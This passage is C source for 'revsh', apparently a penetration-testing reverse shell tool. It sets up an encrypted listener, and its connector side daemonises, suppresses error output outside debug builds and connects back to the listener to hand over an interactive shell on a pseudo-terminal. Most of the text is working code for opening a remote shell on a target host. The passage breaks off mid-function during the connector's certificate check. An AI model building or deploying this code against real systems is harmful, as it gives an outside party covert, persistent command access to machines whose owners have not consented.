
/*
	XXX

	Fixes:
		* Move the rc file code out of broker into the main revsh listener area.
		* Add support for a switch to point to a different rc file.
		* redo comments. Everything there is from the previous incarnation.

		* Fucking meditate on this shit!

	And don't forget to update toolbin. :D


	XXX
*/


/*******************************************************************************
 *
 * revsh
 *
 * emptymonkey's reverse shell tool with terminal support
 *
 * 2013-07-17
 *
 *
 * The revsh tool is intended to be used as both a listener and remote client
 * in establishing a remote shell with terminal support. This isn't intended
 * as a replacement for netcat, but rather as a supplementary tool to ease 
 * remote interaction during long engagements.
 *
 *******************************************************************************/


#include "common.h"
#include "keys/dh_params_2048.c"


/*******************************************************************************
 *
 * usage()
 *
 * Input: None.
 * Output: None.
 *
 * Purpose: Educate the user as to the error of their ways.
 *
 ******************************************************************************/
void usage(){
	fprintf(stderr, "\nusage: %s [-l [-s SHELL]] ADDRESS PORT\n", \
			program_invocation_short_name);
	fprintf(stderr, "\n\t-l: Setup a listener.\n");
	fprintf(stderr, "\t-s SHELL: Invoke SHELL as the remote shell. (Default is /bin/bash.)\n");
	fprintf(stderr, "\n\tNote: The '-s' switch only works with a listener.\n\n");

	exit(-1);
}

int dummy_verify_callback(int preverify_ok, X509_STORE_CTX* ctx) {

	preverify_ok += 0;
	ctx += 0;

	return(1);
}

int main(int argc, char **argv){

	int i, retval, err_flag;

	int opt;
	char *shell = NULL;
	char *keys_dir = NULL;
	char *env_string = NULL;

	char *pty_name;
	int pty_master, pty_slave;
	struct termios saved_termios_attrs, new_termios_attrs;

	char **exec_argv;
	char **exec_envp;
	char **tmp_vector;

	int buff_len, tmp_len;
	char *buff_head, *buff_tail;
	char *buff_ptr;

	int io_bytes;

	struct winsize tty_winsize;

	char tmp_char;

	struct remote_io_helper io;

	BIO *accept;

	struct passwd *passwd_entry;

	char *cipher_list = NULL;

#include "keys/connector_key.c"
	int connector_private_key_len = sizeof(connector_private_key);

#include "keys/connector_cert.c"
	int connector_certificate_len = sizeof(connector_certificate);

	char *listener_cert_path_head = NULL, *listener_cert_path_tail = NULL;
	char *listener_key_path_head = NULL, *listener_key_path_tail = NULL;

  const EVP_MD *fingerprint_type = NULL;
	X509 *remote_cert;
  unsigned int remote_fingerprint_len;
  unsigned char remote_fingerprint[EVP_MAX_MD_SIZE];
	X509 *allowed_cert;
  unsigned int allowed_fingerprint_len;
  unsigned char allowed_fingerprint[EVP_MAX_MD_SIZE];

#include "keys/listener_fingerprint.c"
	char *remote_fingerprint_str;

	FILE *connector_fingerprint_fp;
	
	char *allowed_cert_path_head, *allowed_cert_path_tail;

	SSL_CIPHER *current_cipher;

	char *rc_path_head, *rc_path_tail;
	int rc_fd;
	char *rc_file = NULL;


	io.listener = 0;
	io.encryption = EDH;

	while((opt = getopt(argc, argv, "paels:k:r:")) != -1){
		switch(opt){

			case 'p':
				io.encryption = PLAINTEXT;
				break;

			case 'a':
				io.encryption = ADH;
				break;

			case 'e':
				io.encryption = EDH;
				break;

			case 'l':
				io.listener = 1;
				break;

			case 's':
				shell = optarg;
				break;

			case 'k':
				keys_dir = optarg;
				break;
			case 'r':
				rc_file = optarg;
				break;

			default:
				usage();
		}
	}

	if((argc - optind) != 2){
		usage();
	}

	switch(io.encryption){

		case ADH:
			cipher_list = ADH_CIPHER;
			break;

		case EDH:
			cipher_list = SERVER_CIPHER;
			break;
	}


	buff_len = getpagesize();
	if((buff_head = (char *) calloc(buff_len, sizeof(char))) == NULL){
		error(-1, errno, "calloc(%d, %d)", buff_len, (int) sizeof(char));
	}

	tmp_len = strlen(argv[optind]);
	memcpy(buff_head, argv[optind], tmp_len);
	buff_head[tmp_len++] = ':';
	strcat(buff_head, argv[optind + 1]);

	SSL_library_init();
	SSL_load_error_strings();

	if(io.encryption){
		io.remote_read = &remote_read_encrypted;
		io.remote_write = &remote_write_encrypted;
	}else{
		io.remote_read = &remote_read_plaintext;
		io.remote_write = &remote_write_plaintext;
	}

	if(io.encryption){
		fingerprint_type = EVP_sha1();
	}

	/*
	 * Listener:
	 * - Open a socket.
	 * - Listen for a connection.
	 * - Send initial shell data.
	 * - Send initial environment data.
	 * - Send initial termios data.
	 * - Set local terminal to raw. 
	 * - Enter broker() for data brokering.
	 * - Reset local term.
	 * - Exit.
	 */
	if(io.listener){

		if(io.encryption == EDH){
			if((listener_cert_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
				fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
						program_invocation_short_name, io.listener, PATH_MAX, (int) sizeof(char), \
						strerror(errno));
				exit(-1);
			}

			if(!keys_dir){
				memcpy(listener_cert_path_head, getenv("HOME"), strnlen(getenv("HOME"), PATH_MAX));

				listener_cert_path_tail = index(listener_cert_path_head, '\0');
				*(listener_cert_path_tail++) = '/';
				sprintf(listener_cert_path_tail, REVSH_DIR);
				listener_cert_path_tail = index(listener_cert_path_head, '\0');
				*(listener_cert_path_tail++) = '/';
				sprintf(listener_cert_path_tail, KEYS_DIR);
			}else{
				memcpy(listener_cert_path_head, keys_dir, strnlen(keys_dir, PATH_MAX));
			}
			listener_cert_path_tail = index(listener_cert_path_head, '\0');
			*(listener_cert_path_tail++) = '/';
			sprintf(listener_cert_path_tail, LISTENER_CERT_FILE);


			if((listener_cert_path_head - listener_cert_path_tail) > PATH_MAX){
				fprintf(stderr, "%s: %d: listener cert file: path too long!\n",
						program_invocation_short_name, io.listener);
				exit(-1);
			}

			if((listener_key_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
				fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
						program_invocation_short_name, io.listener, PATH_MAX, (int) sizeof(char), \
						strerror(errno));
				exit(-1);
			}

			if(!keys_dir){
				memcpy(listener_key_path_head, getenv("HOME"), strnlen(getenv("HOME"), PATH_MAX));

				listener_key_path_tail = index(listener_key_path_head, '\0');
				*(listener_key_path_tail++) = '/';
				sprintf(listener_key_path_tail, REVSH_DIR);
				listener_key_path_tail = index(listener_key_path_head, '\0');
				*(listener_key_path_tail++) = '/';
				sprintf(listener_key_path_tail, KEYS_DIR);
			}else{
				memcpy(listener_key_path_head, keys_dir, strnlen(keys_dir, PATH_MAX));
			}
			listener_key_path_tail = index(listener_key_path_head, '\0');
			*(listener_key_path_tail++) = '/';
			sprintf(listener_key_path_tail, LISTENER_KEY_FILE);


			if((listener_key_path_head - listener_key_path_tail) > PATH_MAX){
				fprintf(stderr, "%s: %d: listener key file: path too long!\n",
						program_invocation_short_name, io.listener);
				exit(-1);
			}
		}


		printf("Listening...\n");
		fflush(stdout);

		if(io.encryption){

			if((io.ctx = SSL_CTX_new(TLSv1_server_method())) == NULL){
				fprintf(stderr, "%s: %d: SSL_CTX_new(TLSv1_server_method()): %s\n", \
						program_invocation_short_name, io.listener, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if((io.dh = get_dh2048()) == NULL){
				fprintf(stderr, "%s: %d: get_dh2048(): %s\n", \
						program_invocation_short_name, io.listener, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if(!SSL_CTX_set_tmp_dh(io.ctx, io.dh)){
				fprintf(stderr, "%s: %d: SSL_CTX_set_tmp_dh(%lx, %lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ctx, (unsigned long) io.dh, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if(SSL_CTX_set_cipher_list(io.ctx, cipher_list) != 1){
				fprintf(stderr, "%s: %d: SSL_CTX_set_cipher_list(%lx, %s): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ctx, cipher_list, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if(io.encryption == EDH){
				SSL_CTX_set_verify(io.ctx, SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, dummy_verify_callback);

				if((retval = SSL_CTX_use_certificate_file(io.ctx, listener_cert_path_head, SSL_FILETYPE_PEM)) != 1){
					fprintf(stderr, "%s: %d: SSL_CTX_use_certificate_file(%lx, %s, SSL_FILETYPE_PEM): %s\n", \
							program_invocation_short_name, io.listener, (unsigned long) io.ctx, listener_cert_path_head, strerror(errno));
					ERR_print_errors_fp(stderr);
					exit(-1);
				}

				if((retval = SSL_CTX_use_PrivateKey_file(io.ctx, listener_key_path_head, SSL_FILETYPE_PEM)) != 1){
					fprintf(stderr, "%s: %d: SSL_CTX_use_PrivateKey_file(%lx, %s, SSL_FILETYPE_PEM): %s\n", \
							program_invocation_short_name, io.listener, (unsigned long) io.ctx, listener_key_path_head, strerror(errno));
					ERR_print_errors_fp(stderr);
					exit(-1);
				}

				if((retval = SSL_CTX_check_private_key(io.ctx)) != 1){
					fprintf(stderr, "%s: %d: SSL_CTX_check_private_key(%lx): %s\n", \
							program_invocation_short_name, io.listener, (unsigned long) io.ctx, strerror(errno));
					ERR_print_errors_fp(stderr);
					exit(-1);
				}
			}

		}

		if((accept = BIO_new_accept(buff_head)) == NULL){
			fprintf(stderr, "%s: %d: BIO_new_accept(%s): %s\n", \
					program_invocation_short_name, io.listener, buff_head, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(BIO_set_bind_mode(accept, BIO_BIND_REUSEADDR) <= 0){
			fprintf(stderr, "%s: %d: BIO_set_bind_mode(%lx, BIO_BIND_REUSEADDR): %s\n", \
					program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(BIO_do_accept(accept) <= 0){
			fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
					program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(BIO_do_accept(accept) <= 0){
			fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
					program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if((io.connect = BIO_pop(accept)) == NULL){
			fprintf(stderr, "%s: %d: BIO_pop(%lx): %s\n", \
					program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		BIO_free(accept);

		if(BIO_get_fd(io.connect, &(io.remote_fd)) < 0){
			fprintf(stderr, "%s: %d: BIO_get_fd(%lx, %lx): %s\n", \
					program_invocation_short_name, io.listener, (unsigned long) io.connect, (unsigned long) &(io.remote_fd), strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(io.encryption){
			if(!(io.ssl = SSL_new(io.ctx))){
				fprintf(stderr, "%s: %d: SSL_new(%lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ctx, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1); 
			}

			SSL_set_bio(io.ssl, io.connect, io.connect);

			if(SSL_accept(io.ssl) < 1){
				fprintf(stderr, "%s: %d: SSL_accept(%lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ssl, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if(io.encryption == EDH){
				if((allowed_cert_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
					fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
							program_invocation_short_name, io.listener, PATH_MAX, (int) sizeof(char), \
							strerror(errno));
					exit(-1);
				}

				if(!keys_dir){
					memcpy(allowed_cert_path_head, getenv("HOME"), strnlen(getenv("HOME"), PATH_MAX));

					allowed_cert_path_tail = index(allowed_cert_path_head, '\0');
					*(allowed_cert_path_tail++) = '/';
					sprintf(allowed_cert_path_tail, REVSH_DIR);
					allowed_cert_path_tail = index(allowed_cert_path_head, '\0');
					*(allowed_cert_path_tail++) = '/';
					sprintf(allowed_cert_path_tail, KEYS_DIR);
				}else{
					memcpy(allowed_cert_path_head, keys_dir, strnlen(keys_dir, PATH_MAX));
				}
				allowed_cert_path_tail = index(allowed_cert_path_head, '\0');
				*(allowed_cert_path_tail++) = '/';
				sprintf(allowed_cert_path_tail, CONNECTOR_CERT_FILE);


				if((allowed_cert_path_head - allowed_cert_path_tail) > PATH_MAX){
					fprintf(stderr, "%s: %d: connector fingerprint file: path too long!\n",
							program_invocation_short_name, io.listener);
					exit(-1);
				}
		
				if((connector_fingerprint_fp = fopen(allowed_cert_path_head, "r")) == NULL){
					fprintf(stderr, "%s: %d: fopen(%s, 'r'): %s\n",
							program_invocation_short_name, io.listener, allowed_cert_path_head, strerror(errno));
					exit(-1);
				}

				if((allowed_cert = PEM_read_X509(connector_fingerprint_fp, NULL, NULL, NULL)) == NULL){
					fprintf(stderr, "%s: %d: PEM_read_X509(%lx, NULL, NULL, NULL): %s\n", \
							program_invocation_short_name, io.listener, (unsigned long) connector_fingerprint_fp, strerror(errno));
					ERR_print_errors_fp(stderr);
					exit(-1);
				}

				if(fclose(connector_fingerprint_fp)){
					fprintf(stderr, "%s: %d: fclose(%lx): %s\n",
							program_invocation_short_name, io.listener, (unsigned long) connector_fingerprint_fp, strerror(errno));
					exit(-1);
				}

				if(!X509_digest(allowed_cert, fingerprint_type, allowed_fingerprint, &allowed_fingerprint_len)){
					fprintf(stderr, "%s: %d: X509_digest(%lx, %lx, %lx, %lx): %s\n", \
							program_invocation_short_name, io.listener, \
							(unsigned long) allowed_cert, \
							(unsigned long) fingerprint_type, \
							(unsigned long) allowed_fingerprint, \
							(unsigned long) &allowed_fingerprint_len, \
							strerror(errno));
					ERR_print_errors_fp(stderr);
					exit(-1);
				}

				//printf("Remote fingerprint expected:\n\t%s\n", connector_fingerprint_str);

				if((remote_cert = SSL_get_peer_certificate(io.ssl)) == NULL){
					fprintf(stderr, "%s: %d: SSL_get_peer_certificate(%lx): %s\n", \
							program_invocation_short_name, io.listener, (unsigned long) io.ssl, strerror(errno));
					ERR_print_errors_fp(stderr);
					exit(-1);
				}

				printf("Remote fingerprint expected:\n\t");
				for(i = 0; i < (int) allowed_fingerprint_len; i++){
					printf("%02x", allowed_fingerprint[i]);
				}
				printf("\n");

				if(!X509_digest(remote_cert, fingerprint_type, remote_fingerprint, &remote_fingerprint_len)){
					fprintf(stderr, "%s: %d: X509_digest(%lx, %lx, %lx, %lx): %s\n", \
							program_invocation_short_name, io.listener, \
							(unsigned long) remote_cert, \
							(unsigned long) fingerprint_type, \
							(unsigned long) remote_fingerprint, \
							(unsigned long) &remote_fingerprint_len, \
							strerror(errno));
					ERR_print_errors_fp(stderr);
					exit(-1);
				}

				printf("Remote fingerprint recieved:\n\t");
				for(i = 0; i < (int) remote_fingerprint_len; i++){
					printf("%02x", remote_fingerprint[i]);
				}
				printf("\n");

				if(allowed_fingerprint_len != remote_fingerprint_len){
					fprintf(stderr, "%s: %d: Fingerprint mistmatch. Possible mitm. Aborting!\n", \
							program_invocation_short_name, io.listener);
					exit(-1);
				}

				for(i = 0; i < (int) allowed_fingerprint_len; i++){
					if(allowed_fingerprint[i] != remote_fingerprint[i]){
						fprintf(stderr, "%s: %d: Fingerprint mistmatch. Possible mitm. Aborting!\n", \
								program_invocation_short_name, io.listener);
						exit(-1);
					}
				}
			}
		}

		printf("Initializing...");
		fflush(stdout);

		// - Send initial shell data.
		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;
		*(buff_tail++) = (char) APC;
		if(shell){
			tmp_len = strlen(shell);
			memcpy(buff_tail, shell, tmp_len);
		}else{
			tmp_len = strlen(DEFAULT_SHELL);
			memcpy(buff_tail, DEFAULT_SHELL, tmp_len);
		}
		buff_tail += tmp_len;

		*(buff_tail++) = (char) ST;

		if((buff_tail - buff_head) >= buff_len){
			print_error(&io, "%s: %d: Environment string too long.\n", program_invocation_short_name, io.listener);
			exit(-1);
		}

		tmp_len = strlen(buff_head);
		if((io_bytes = io.remote_write(&io, buff_head, tmp_len)) == -1){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) buff_head, tmp_len, strerror(errno));
			exit(-1);
		}

		if(io_bytes != (buff_tail - buff_head)){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) buff_head, buff_len);
			exit(-1);
		}

		// - Send initial environment data.
		tmp_len = strlen(DEFAULT_ENV);
		if((env_string = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
			print_error(&io, "%s: %d: calloc(strlen(%d, %d)): %s\n", \
					program_invocation_short_name, io.listener, \
					tmp_len + 1, (int) sizeof(char), strerror(errno));
			exit(-1);
		}

		memcpy(env_string, DEFAULT_ENV, tmp_len);

		if((exec_envp = string_to_vector(env_string)) == NULL){
			print_error(&io, "%s: %d: string_to_vector(%s): %s\n", \
					program_invocation_short_name, io.listener, \
					env_string, strerror(errno));
			exit(-1);
		}

		buff_tail = buff_head;
		*(buff_tail++) = (char) APC;

		for(i = 0; exec_envp[i]; i++){

			if((buff_tail - buff_head) >= buff_len){
				print_error(&io, "%s: %d: Environment string too long.\n", \
						program_invocation_short_name, io.listener);
				exit(-1);
			}else if(buff_tail != (buff_head + 1)){
				*(buff_tail++) = ' ';
			}

			tmp_len = strlen(exec_envp[i]);
			memcpy(buff_tail, exec_envp[i], tmp_len);

			buff_tail += tmp_len;

			*(buff_tail++) = '=';

			if((buff_ptr = getenv(exec_envp[i])) == NULL){
				fprintf(stderr, "%s: No such environment variable \"%s\". Ignoring.\n", \
						program_invocation_short_name, exec_envp[i]);
			}else{
				tmp_len = strlen(buff_ptr);
				memcpy(buff_tail, buff_ptr, tmp_len);
				buff_tail += tmp_len;
			}
		}

		*(buff_tail++) = (char) ST;

		if((buff_tail - buff_head) >= buff_len){
			print_error(&io, "%s: %d: Environment string too long.\n", \
					program_invocation_short_name, io.listener);
			exit(-1);
		}

		tmp_len = strlen(buff_head);
		if((io_bytes = io.remote_write(&io, buff_head, tmp_len)) == -1){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) buff_head, tmp_len, strerror(errno));
			exit(-1);
		}

		if(io_bytes != (buff_tail - buff_head)){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) buff_head, buff_len);
			exit(-1);
		}


		// - Send initial termios data.
		if((retval = ioctl(STDIN_FILENO, TIOCGWINSZ, &tty_winsize)) == -1){
			print_error(&io, "%s: %d: ioctl(STDIN_FILENO, TIOCGWINSZ, %lx): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &tty_winsize, strerror(errno));
			exit(-1);
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;
		*(buff_tail++) = (char) APC;

		if((retval = snprintf(buff_tail, buff_len - 2, "%hd %hd", \
						tty_winsize.ws_row, tty_winsize.ws_col)) < 0){
			print_error(&io, "%s: %d: snprintf(buff_head, buff_len, \"%%hd %%hd\", %hd, %hd): %s\n", \
					program_invocation_short_name, io.listener, \
					tty_winsize.ws_row, tty_winsize.ws_col, strerror(errno));
			exit(-1);
		}

		buff_tail += retval;
		*(buff_tail++) = (char) ST;

		tmp_len = strlen(buff_head);
		if((io_bytes = io.remote_write(&io, buff_head, tmp_len)) == -1){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) buff_head, tmp_len, strerror(errno));
			exit(-1);
		}

		if(io_bytes != tmp_len){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) buff_head, tmp_len);
			exit(-1);
		}

		// - Set local terminal to raw. 
		if((retval = tcgetattr(STDIN_FILENO, &saved_termios_attrs)) == -1){
			print_error(&io, "%s: %d: tcgetattr(STDIN_FILENO, %lx): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &saved_termios_attrs, strerror(errno));
			exit(-1);
		}

		memcpy(&new_termios_attrs, &saved_termios_attrs, sizeof(struct termios));

		new_termios_attrs.c_lflag &= ~(ECHO|ICANON|IEXTEN|ISIG);
		new_termios_attrs.c_iflag &= ~(BRKINT|ICRNL|INPCK|ISTRIP|IXON);
		new_termios_attrs.c_cflag &= ~(CSIZE|PARENB);
		new_termios_attrs.c_cflag |= CS8;
		new_termios_attrs.c_oflag &= ~(OPOST);

		new_termios_attrs.c_cc[VMIN] = 1;
		new_termios_attrs.c_cc[VTIME] = 0;

		if((retval = tcsetattr(STDIN_FILENO, TCSANOW, &new_termios_attrs)) == -1){
			print_error(&io, "%s: %d: tcsetattr(STDIN_FILENO, TCSANOW, %lx): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &new_termios_attrs, strerror(errno));
			exit(-1);
		}	

		printf("\tDone!\r\n");
		fflush(stdout);

		io.local_fd = STDIN_FILENO;

		// Let's add support for .revsh/rc files here! :D
		if(io.listener){

			if((rc_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
				print_error(&io, "%s: %d: calloc(%d, %d): %s\r\n", \
						program_invocation_short_name, io.listener, PATH_MAX, (int) sizeof(char), \
						strerror(errno));
				exit(-1);
			}

			if(rc_file){
				memcpy(rc_path_head, rc_file, strlen(rc_file));
			}else{
				memcpy(rc_path_head, getenv("HOME"), strnlen(getenv("HOME"), PATH_MAX));

				rc_path_tail = index(rc_path_head, '\0');
				*(rc_path_tail++) = '/';
				sprintf(rc_path_tail, REVSH_DIR);
				rc_path_tail = index(rc_path_head, '\0');
				*(rc_path_tail++) = '/';
				sprintf(rc_path_tail, RC_FILE);

				if((rc_path_head - rc_path_tail) > PATH_MAX){
					print_error(&io, "%s: %d: rc file: path too long!\n",
							program_invocation_short_name, io.listener);
					exit(-1);
				}
			}

			if((rc_fd = open(rc_path_head, O_RDONLY)) != -1){

				buff_tail = buff_head;
				buff_ptr = buff_head;

				while((io_bytes = read(rc_fd, buff_head, buff_len))){
					if(io_bytes == -1){
						print_error(&io, "%s: %d: broker(): read(%d, %lx, %d): %s\r\n", \
								program_invocation_short_name, io.listener, \
								rc_fd, (unsigned long) buff_head, buff_len, strerror(errno));
						exit(-1);
					}
					buff_tail = buff_head + io_bytes;

					while(buff_ptr != buff_tail){
						if((retval = io.remote_write(&io, buff_ptr, (buff_tail - buff_ptr))) == -1){
							print_error(&io, "%s: %d: broker(): io.remote_write(%lx, %lx, %d): %s\r\n", \
									program_invocation_short_name, io.listener, \
									(unsigned long) &io, (unsigned long) buff_ptr, (buff_tail - buff_ptr), strerror(errno));
							exit(-1);
						}
						buff_ptr += retval;
					}
				}

				close(rc_fd);
			}
		}

		errno = 0;
		// - Enter broker() for data brokering.
		if((retval = broker(&io) == -1)){
			print_error(&io, "%s: %d: broker(%lx): %s\r\n", \
					program_invocation_short_name, io.listener, (unsigned long) &io,
					strerror(errno));
		}

		err_flag = 0;
		if(errno == ECONNRESET){
			err_flag = errno;
		}

		// - Reset local term.
		tcsetattr(STDIN_FILENO, TCSANOW, &saved_termios_attrs);

		// - Exit.
		if(!err_flag){
			printf("Good-bye!\n");

		}else{
			while((retval = io.remote_read(&io, buff_head, buff_len)) > 0){
				write(STDERR_FILENO, buff_head, retval);
			}
		}
		if(io.encryption){
			SSL_shutdown(io.ssl);
			SSL_free(io.ssl);
			SSL_CTX_free(io.ctx);
		}else{
			BIO_free(io.connect);
		}

		return(0);

	}else{

		/*
		 * Connector: 
		 * - Become a daemon.
		 * - Open a network connection back to a listener.
		 * - Check for usage and exit, if needed. 
		 * - Receive and set the shell.
		 * - Receive and set the initial environment.
		 * - Receive and set the initial termios.
		 * - Create a pseudo-terminal (pty).
		 * - Send basic information back to the listener about the connecting host.
		 * - Fork a child to run the shell.
		 * - Parent: Enter the broker() and broker data.
		 * - Child: Initialize file descriptors.
		 * - Child: Set the pty as controlling.
		 * - Child: Call execve() to invoke a shell.
		 */


		// - Become a daemon.
		umask(0);


		retval = fork();

#ifndef DEBUG

		if(retval == -1){
			error(-1, errno, "fork()");
		}else if(retval){
			exit(0);
		}

		if((retval = setsid()) == -1){
			error(-1, errno, "setsid()");
		}

		if((retval = chdir("/")) == -1){
			error(-1, errno, "chdir(\"/\")");
		}

#endif

		if(io.encryption){

			if((io.ctx = SSL_CTX_new(TLSv1_client_method())) == NULL){
#ifndef DEBUG
				fprintf(stderr, "%s: %d: SSL_CTX_new(TLSv1_client_method()): %s\n", \
						program_invocation_short_name, io.listener, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			if(SSL_CTX_set_cipher_list(io.ctx, CLIENT_CIPHER) != 1){
#ifndef DEBUG
				fprintf(stderr, "%s: %d: SSL_CTX_set_cipher_list(%lx, %s): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ctx, CLIENT_CIPHER, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			SSL_CTX_set_verify(io.ctx, SSL_VERIFY_PEER, dummy_verify_callback);

			if((retval = SSL_CTX_use_certificate_ASN1(io.ctx, connector_certificate_len, connector_certificate)) != 1){
#ifndef DEBUG
				fprintf(stderr, "%s: %d: SSL_CTX_use_certificate_ASN1(%lx, %d, %lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ctx, connector_certificate_len, (unsigned long) connector_certificate, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			if((retval = SSL_CTX_use_RSAPrivateKey_ASN1(io.ctx, connector_private_key, connector_private_key_len)) != 1){
#ifndef DEBUG
				fprintf(stderr, "%s: %d: SSL_CTX_use_RSAPrivateKey_ASN1(%lx, %lx, %d): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ctx, (unsigned long) connector_private_key, connector_private_key_len, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			if((retval = SSL_CTX_check_private_key(io.ctx)) != 1){
#ifndef DEBUG
				fprintf(stderr, "%s: %d: SSL_CTX_check_private_key(%lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ctx, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}
		}

		if((io.connect = BIO_new_connect(buff_head)) == NULL){
#ifndef DEBUG
			fprintf(stderr, "%s: %d: BIO_new_connect(%s): %s\n", \
					program_invocation_short_name, io.listener, buff_head, strerror(errno));
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}

		if(BIO_do_connect(io.connect) <= 0){
#ifndef DEBUG
			fprintf(stderr, "%s: %d: BIO_do_connect(%lx): %s\n", \
					program_invocation_short_name, io.listener, (unsigned long) io.connect, strerror(errno));
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}

		if(BIO_get_fd(io.connect, &(io.remote_fd)) < 0){
#ifndef DEBUG
			fprintf(stderr, "%s: %d: BIO_get_fd(%lx, %lx): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) io.connect, (unsigned long) &(io.remote_fd), strerror(errno));
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}

		if(io.encryption > PLAINTEXT){

			if(!(io.ssl = SSL_new(io.ctx))){
#ifndef DEBUG
				fprintf(stderr, "%s: %d: SSL_new(%lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ctx, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			SSL_set_bio(io.ssl, io.connect, io.connect);

			if((retval = SSL_connect(io.ssl)) < 1){
#ifndef DEBUG
				fprintf(stderr, "%s: %d: SSL_connect(%lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ssl, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			if((current_cipher = SSL_get_current_cipher(io.ssl)) == NULL){
#ifndef DEBUG
				fprintf(stderr, "%s: %d: SSL_get_current_cipher(%lx): No cipher set!\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ssl);
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			if(!strcmp(current_cipher->name, EDH_CIPHER)){

				if((remote_cert = SSL_get_peer_certificate(io.ssl)) == NULL){
#ifndef DEBUG
					fprintf(stderr, "%s: %d: SSL_get_peer_certificate(%lx): %s\n", \
							program_invocation_short_name, io.listener, (unsigned long) io.ssl, strerror(errno));
					ERR_print_errors_fp(stderr);
#endif
					exit(-1);
				}

				if(!X509_digest(remote_cert, fingerprint_type, remote_fingerprint, &remote_fingerprint_len)){
#ifndef DEBUG
					fprintf(stderr, "%s: %d: X509_digest(%lx, %lx, %lx, %lx): %s\n", \
							program_invocation_short_name, io.listener, \
							(unsigned long) remote_cert, \
							(unsigned long) fingerprint_type, \
							(unsigned long) remote_fingerprint, \
							(unsigned long) &remote_fingerprint_len, \
							strerror(errno));
					ERR_print_errors_fp(stderr);
#endif
					exit(-1);
				}

				if((remote_fingerprint_str = (char *) calloc(strlen(listener_fingerprint_str) + 1, sizeof(char))) == NULL){
					fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
							program_invocation_short_name, io.listener, (int) strlen(listener_fingerprint_str) + 1, (int) sizeof(char), \
							strerror(errno));
					exit(-1);
				}

				for(i = 0; i < (int) remote_fingerprint_len; i++){
					sprintf(remote_fingerprint_str + (i * 2), "%02x", remote_fingerprint[i]);
				}

				if(strncmp(listener_fingerprint_str, remote_fingerprint_str, strlen(listener_fingerprint_str))){
#ifndef DEBUG
					fprintf(stderr, "Remote fingerprint expected:\n\t%s\n", listener_fingerprint_str);
